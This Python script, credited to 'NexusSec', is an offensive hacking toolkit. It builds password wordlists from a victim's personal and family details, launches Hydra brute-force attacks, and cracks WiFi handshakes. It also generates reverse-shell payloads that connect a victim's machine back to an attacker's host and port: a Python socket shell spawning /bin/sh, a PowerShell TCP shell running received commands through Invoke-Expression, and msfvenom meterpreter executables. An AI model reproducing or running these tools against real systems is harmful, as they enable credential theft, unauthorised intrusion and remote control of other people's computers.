#bin/python!#
#Code by NexusSec 
#@nexussecelite 

import subprocess
import random
import string
import os
import sys
import ipinfo
import ducktoolkit as dk
import time
from colorama import Fore, Style, init
from tqdm import tqdm
from scapy.all import sniff, ARP
import socket
import platform
import pywifi

# Initialize Colorama
init()

def install_packages():
    packages = ['colorama', 'tqdm', 'ducktoolkit', 'ipinfo', 'pywifi', 'scapy']
    try:
        import pip
        for package in packages:
            try:
                __import__(package)
            except ImportError:
                print(f"{Fore.YELLOW}Installing missing package: {package}{Style.RESET_ALL}")
                subprocess.check_call([sys.executable, '-m', 'pip', 'install', package])
    except Exception as e:
        print(f"{Fore.RED}Error installing packages: {e}{Style.RESET_ALL}")
        sys.exit(1)

def clear_console():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_logo(mode="main"):
    logo_banner = """{0}██████╗ ██████╗ ██╗   ██╗████████╗███████╗███╗   ███╗ ██████╗ ██████╗ ███████╗{1}
██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝████╗ ████║██╔═══██╗██╔══██╗██╔════╝
██████╔╝██████╔╝██║   ██║   ██║   █████╗  ██╔████╔██║██║   ██║██║  ██║█████╗  
██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══╝  ██║╚██╔╝██║██║   ██║██║  ██║██╔══╝  
██████╔╝██║  ██║╚██████╔╝   ██║   ███████╗██║ ╚═╝ ██║╚██████╔╝██████╔╝███████╗{1}
╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝╚═╝     ╚═╝ ╚═════╝ ╚═════╝ ╚══════╝{1}
                                                                              
    							Code By @nexussecelite """.format(Fore.GREEN, Style.RESET_ALL)
    logo_banner1 = """{0}███████╗██╗  ██╗██████╗ ██╗      ██████╗ ████████╗███╗   ███╗ ██████╗ ██████╗ ███████╗{1}
██╔════╝╚██╗██╔╝██╔══██╗██║     ██╔═══██╗╚══██╔══╝████╗ ████║██╔═══██╗██╔══██╗██╔════╝
█████╗   ╚███╔╝ ██████╔╝██║     ██║   ██║   ██║   ██╔████╔██║██║   ██║██║  ██║█████╗  
██╔══╝   ██╔██╗ ██╔═══╝ ██║     ██║   ██║   ██║   ██║╚██╔╝██║██║   ██║██║  ██║██╔══╝  
███████╗██╔╝ ██╗██║     ███████╗╚██████╔╝   ██║   ██║ ╚═╝ ██║╚██████╔╝██████╔╝███████╗{1}
╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝    ╚═╝   ╚═╝     ╚═╝ ╚═════╝ ╚═════╝ ╚══════╝{1}
                                                                                      
                            Code By @nexussecelite """.format(Fore.CYAN, Style.RESET_ALL)
    logos = {"main": logo_banner, "advanced": logo_banner1}
    print(logos.get(mode, logo_banner))

def generate_wordlist():
    clear_console()
    print("Code By Nexus Sec")
    print_logo("main")

    entries = {
        "Victim's First Name": "",
        "Victim's Surname": "",
        "Victim's Nickname": "",
        "Victim's Birthdate": "",
        "Partner's Name": "",
        "Partner's Nickname": "",
        "Partner's Birthdate": "",
        "Child's Name": "",
        "Child's Nickname": "",
        "Child's Birthdate": "",
        "Company Name": "",
        "Keywords (space-separated)": ""
    }

    for label in entries:
        entries[label] = input(f"{Fore.YELLOW}{label}{Style.RESET_ALL}: ")

    special_chars = input(f"{Fore.YELLOW}Add Special Characters? (Y/N): {Style.RESET_ALL}").strip().lower() == 'y'
    add_numbers = input(f"{Fore.YELLOW}Add Random Numbers? (Y/N): {Style.RESET_ALL}").strip().lower() == 'y'

    wordlist = []
    words_to_combine = [entries[label] for label in entries]
    keywords = words_to_combine[-1].split()
    words_to_combine = words_to_combine[:-1] + keywords

    for word in words_to_combine:
        word_variations = [word.lower(), word.upper(), word.title()]
        wordlist.extend(word_variations)

        if special_chars:
            wordlist.extend([word_var + char for word_var in word_variations for char in string.punctuation])

        if add_numbers:
            wordlist.extend([word_var + ''.join(random.choices(string.digits, k=random.randint(1, 5))) for word_var in word_variations])

    filename = "wordlist.txt"
    print(f"{Fore.CYAN}Generating wordlist...{Style.RESET_ALL}")
    time.sleep(1)  # Simulate some processing time with a sleep

    with open(filename, 'w') as file:
        file.write('\n'.join(wordlist))

    print(f"{Fore.GREEN}Wordlist saved to {filename}{Style.RESET_ALL}")

def perform_hydra_attack():
    clear_console()
    print_logo("main")

    target = input(f"{Fore.YELLOW}Enter the target URL or IP: {Style.RESET_ALL}")
    protocol = input(f"{Fore.YELLOW}Enter the protocol (http-post-form, ftp, etc.): {Style.RESET_ALL}")

    attack_type = input(f"{Fore.YELLOW}Attack Type (single/multi): {Style.RESET_ALL}").strip().lower()
    if attack_type == "single":
        username = input(f"{Fore.YELLOW}Enter the single username: {Style.RESET_ALL}")
        userlist_path = ""
    else:
        username = ""
        userlist_path = input(f"{Fore.YELLOW}Enter the path to userlist: {Style.RESET_ALL}")

    passlist_path = input(f"{Fore.YELLOW}Enter the path to the password list: {Style.RESET_ALL}")

    hydra_command = f"hydra -l {username} -P {passlist_path} {target} {protocol} -V -o found_credentials.txt -u" if attack_type == "single" else f"hydra -L {userlist_path} -P {passlist_path} {target} {protocol} -V -o found_credentials.txt -u"

    print(f"{Fore.CYAN}Running Hydra attack...{Style.RESET_ALL}")
    run_command(hydra_command, None)

    # Show the user and password from the results
    print(f"{Fore.GREEN}Attack Complete!{Style.RESET_ALL}")
    with open("found_credentials.txt", 'r') as file:
        lines = file.readlines()
        if lines:
            print(f"{Fore.YELLOW}Credentials found:{Style.RESET_ALL}")
            for line in lines:
                if ":" in line:
                    user, password = line.strip().split(":", 1)
                    print(f"{Fore.GREEN}Username: {user}{Style.RESET_ALL}")
                    print(f"{Fore.GREEN}Password: {password}{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}No credentials found.{Style.RESET_ALL}")

    print(f"{Fore.RED}Exiting the program.{Style.RESET_ALL}")
    sys.exit()

def crack_wifi_handshake():
    clear_console()
    print_logo("main")

    cap_file_path = input(f"{Fore.YELLOW}Enter the path to the .cap file: {Style.RESET_ALL}")
    wordlist_path = input(f"{Fore.YELLOW}Enter the path to the wordlist: {Style.RESET_ALL}")

    command = f"aircrack-ng {cap_file_path} -w {wordlist_path}"
    print(f"{Fore.CYAN}Cracking the WiFi handshake...{Style.RESET_ALL}")
    run_command(command, None)

def advanced_mode():
    clear_console()
    print_logo("advanced")

    options = {
        "1": reverse_shell,
        "2": payload_generator,
        "3": ip_tracer,
        "4": ducky_script_encoder,
        "5": ps1_payload,
        "6": wifi_mode,
        "7": system_info,
        "8": sys.exit
    }

    while True:
        print(f"""
        {Fore.YELLOW}1. Reverse Shell Payload{Style.RESET_ALL}
        {Fore.YELLOW}2. Custom Payload Generator{Style.RESET_ALL}
        {Fore.YELLOW}3. IP Tracer{Style.RESET_ALL}
        {Fore.YELLOW}4. Ducky Script Encoder{Style.RESET_ALL}
        {Fore.YELLOW}5. PS1 Payload Generator{Style.RESET_ALL}
        {Fore.YELLOW}6. WiFi Mode{Style.RESET_ALL}
        {Fore.YELLOW}7. System Information{Style.RESET_ALL}
        {Fore.YELLOW}8. Exit{Style.RESET_ALL}
        """)

        choice = input(f"{Fore.CYAN}Select an option: {Style.RESET_ALL}").strip()
        if choice in options:
            clear_console()
            print_logo("advanced")
            options[choice]()
            if choice != "8":
                input(f"{Fore.CYAN}Press Enter to return to the menu...{Style.RESET_ALL}")
                clear_console()
        else:
            print(f"{Fore.RED}Invalid choice. Please select again.{Style.RESET_ALL}")

def reverse_shell():
    clear_console()
    print_logo("advanced")
    print(f"{Fore.CYAN}Generating reverse shell payload...{Style.RESET_ALL}")

    lhost = input(f"{Fore.YELLOW}Enter LHOST: {Style.RESET_ALL}")
    lport = input(f"{Fore.YELLOW}Enter LPORT: {Style.RESET_ALL}")

    reverse_shell_payload = f"import socket, subprocess, os\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.connect(('{lhost}', {lport}))\nos.dup2(s.fileno(), 0)\nos.dup2(s.fileno(), 1)\nos.dup2(s.fileno(), 2)\nsubprocess.call(['/bin/sh', '-i'])"

    with open("reverse_shell.py", 'w') as file:
        file.write(reverse_shell_payload)

    print(f"{Fore.GREEN}Reverse shell payload saved to reverse_shell.py{Style.RESET_ALL}")

def payload_generator():
    clear_console()
    print_logo("advanced")
    print(f"{Fore.CYAN}Generating custom payload...{Style.RESET_ALL}")

    lhost = input(f"{Fore.YELLOW}Enter LHOST: {Style.RESET_ALL}")
    lport = input(f"{Fore.YELLOW}Enter LPORT: {Style.RESET_ALL}")
    payload_type = input(f"{Fore.YELLOW}Enter payload type (e.g., 'windows/meterpreter/reverse_tcp'): {Style.RESET_ALL}")

    payload_command = f"msfvenom -p {payload_type} LHOST={lhost} LPORT={lport} -f exe -o payload.exe"
    print(f"{Fore.CYAN}Generating payload...{Style.RESET_ALL}")
    run_command(payload_command, f"{Fore.GREEN}Payload generated and saved as payload.exe{Style.RESET_ALL}")

def ip_tracer():
    clear_console()
    print_logo("advanced")
    print(f"{Fore.CYAN}Tracing IP address...{Style.RESET_ALL}")

    ip = input(f"{Fore.YELLOW}Enter IP address: {Style.RESET_ALL}")

    access_token = input(f"{Fore.YELLOW}Enter your IPinfo API access token: {Style.RESET_ALL}")
    handler = ipinfo.getHandler(access_token)
    details = handler.getDetails(ip)

    print(f"{Fore.GREEN}IP Details:{Style.RESET_ALL}")
    print(details)

def ducky_script_encoder():
    clear_console()
    print_logo("advanced")
    print(f"{Fore.CYAN}Encoding Ducky Script...{Style.RESET_ALL}")

    script = input(f"{Fore.YELLOW}Enter your Ducky Script: {Style.RESET_ALL}")

    encoded_script = dk.encode(script)
    with open("encoded_ducky_script.bin", 'wb') as file:
        file.write(encoded_script)

    print(f"{Fore.GREEN}Ducky Script encoded and saved to encoded_ducky_script.bin{Style.RESET_ALL}")

def ps1_payload():
    clear_console()
    print_logo("advanced")
    print(f"{Fore.CYAN}Generating PS1 payload...{Style.RESET_ALL}")

    lhost = input(f"{Fore.YELLOW}Enter LHOST: {Style.RESET_ALL}")
    lport = input(f"{Fore.YELLOW}Enter LPORT: {Style.RESET_ALL}")
    payload_name = input(f"{Fore.YELLOW}Enter payload name: {Style.RESET_ALL}")

    ps1_payload = f"$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();$writer = New-Object System.IO.StreamWriter($stream);$reader = New-Object System.IO.StreamReader($stream);while(($line = $reader.ReadLine()) -ne $null){{$command = Invoke-Expression $line;$output = $command | Out-String;$writer.WriteLine($output);$writer.Flush();}}"
    with open(f"{payload_name}.ps1", 'w') as file:
        file.write(ps1_payload)

    print(f"{Fore.GREEN}PS1 Payload {payload_name}.ps1 generated.{Style.RESET_ALL}")

def wifi_mode():
    clear_console()
    print_logo("advanced")
    print(f"{Fore.CYAN}WiFi Mode Activated{Style.RESET_ALL}")

    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]
    iface.scan()
    time.sleep(2)
    scan_results = iface.scan_results()

    print(f"{Fore.GREEN}Available WiFi Networks:{Style.RESET_ALL}")
    for network in scan_results:
        ssid = network.ssid
        bssid = network.bssid
        signal_strength = network.signal
        print(f"{Fore.YELLOW}SSID:{Style.RESET_ALL} {ssid} {Fore.YELLOW}BSSID:{Style.RESET_ALL} {bssid} {Fore.YELLOW}Signal:{Style.RESET_ALL} {signal_strength}")

def system_info():
    clear_console()
    print_logo("advanced")
    print(f"{Fore.CYAN}System Information{Style.RESET_ALL}")

    uname = platform.uname()
    system_info = f"""
    {Fore.YELLOW}System:{Style.RESET_ALL} {uname.system}
    {Fore.YELLOW}Node Name:{Style.RESET_ALL} {uname.node}
    {Fore.YELLOW}Release:{Style.RESET_ALL} {uname.release}
    {Fore.YELLOW}Version:{Style.RESET_ALL} {uname.version}
    {Fore.YELLOW}Machine:{Style.RESET_ALL} {uname.machine}
    {Fore.YELLOW}Processor:{Style.RESET_ALL} {uname.processor}
    """

    print(system_info)

def run_command(command, success_message):
    try:
        subprocess.check_call(command, shell=True)
        if success_message:
            print(success_message)
    except subprocess.CalledProcessError as e:
        print(f"{Fore.RED}Error occurred: {e}{Style.RESET_ALL}")

def main():
    install_packages()

    options = {
        "1": generate_wordlist,
        "2": perform_hydra_attack,
        "3": crack_wifi_handshake,
        "4": advanced_mode,
        "5": sys.exit
    }

    while True:
        clear_console()
        print_logo("main")

        print(f"""
        {Fore.YELLOW}1. Generate Wordlist{Style.RESET_ALL}
        {Fore.YELLOW}2. Perform Hydra Attack{Style.RESET_ALL}
        {Fore.YELLOW}3. Crack WiFi Handshake{Style.RESET_ALL}
        {Fore.YELLOW}4. Advanced Mode{Style.RESET_ALL}
        {Fore.YELLOW}5. Exit{Style.RESET_ALL}
        """)

        choice = input(f"{Fore.CYAN}Select an option: {Style.RESET_ALL}").strip()
        if choice in options:
            clear_console()
            print_logo("main")
            options[choice]()
            if choice != "5":
                input(f"{Fore.CYAN}Press Enter to return to the menu...{Style.RESET_ALL}")
                clear_console()
        else:
            print(f"{Fore.RED}Invalid choice. Please select again.{Style.RESET_ALL}")

try:
    main()
except KeyboardInterrupt:
    clear_console()
    print("\nForce Exit \nCode by @nexussecelite")
    sys.exit(0)
